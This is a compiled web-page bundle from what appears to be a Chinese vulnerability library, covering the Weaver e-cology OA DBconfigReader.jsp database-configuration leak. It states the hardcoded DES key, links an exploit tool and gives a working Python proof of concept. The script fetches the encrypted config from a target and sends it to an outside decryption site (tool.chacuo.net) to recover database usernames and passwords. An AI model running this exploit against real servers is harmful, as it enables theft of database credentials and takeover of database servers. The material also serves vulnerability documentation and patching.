import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"2019年10月24日，360CERT监测到友商发布了泛微e-cology OA数据库配置信息泄漏漏洞预警，漏洞等级中。",-1),d=n("p",null,"攻击者可通过存在漏洞的页面直接获取到数据库配置信息。如果攻击者可直接访问数据库，则可直接获取用户数据，甚至可以直接控制数据库服务器。",-1),k=n("p",null,"360CERT判断漏洞等级为中，危害面/影响面低。建议使用泛微e-cology OA的用户及时安装最新补丁，以免遭受黑客攻击。",-1),v=n("p",null,"参考阅读：",-1),m={href:"https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg",target:"_blank",rel:"noopener noreferrer"},h=e(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>目前已知为8.100.0531,不排除其他版本，包括不限于EC7.0、EC8.0、EC9.0版
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>根据源码可以得到DES密钥为 1z2x3c4v5b6n（也有1z2x3c4v的,可以按此规律来爆破）</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091037951.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到会将当前连接数据库的用户名密码，url，logintype等信息进行des加密，并最终进行返回，可以直接通过des解密获取泄露信息。</p><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2>`,7),_={href:"https://github.com/ianxtianxt/ecologyExp.jar",target:"_blank",rel:"noopener noreferrer"},b=e(`<p>python代码</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> base64
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> ast

<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
	headers <span class="token operator">=</span>  <span class="token punctuation">{</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;application/x-www-form-urlencoded&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

	r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content
	s <span class="token operator">=</span> r1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;\\r\\n&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
	res1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
	
	postdata <span class="token operator">=</span> <span class="token punctuation">{</span>
		<span class="token string">&#39;data&#39;</span><span class="token punctuation">:</span>res1<span class="token punctuation">,</span>
		<span class="token string">&#39;type&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;des&#39;</span><span class="token punctuation">,</span>
		<span class="token string">&#39;arg&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1&#39;</span>
	<span class="token punctuation">}</span>
	u <span class="token operator">=</span> <span class="token string">&#39;http://tool.chacuo.net/cryptdes&#39;</span>
	r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>u<span class="token punctuation">,</span>data<span class="token operator">=</span>postdata<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content	
	res2 <span class="token operator">=</span> ast<span class="token punctuation">.</span>literal_eval<span class="token punctuation">(</span>r2<span class="token punctuation">)</span>
	
	<span class="token keyword">return</span> res2<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span>

url <span class="token operator">=</span> <span class="token string">&#39;http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp&#39;</span>
<span class="token keyword">print</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2);function g(x,f){const a=o("ExternalLinkIcon");return i(),c("div",null,[r,u,d,k,v,n("ul",null,[n("li",null,[n("a",m,[s("https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg"),t(a)])])]),h,n("p",null,[n("a",_,[s("Github链接"),t(a)])]),b])}const z=p(l,[["render",g],["__file","泛微OA DBconfigReader.jsp 数据库配置信息泄漏漏洞.html.vue"]]);export{z as default};
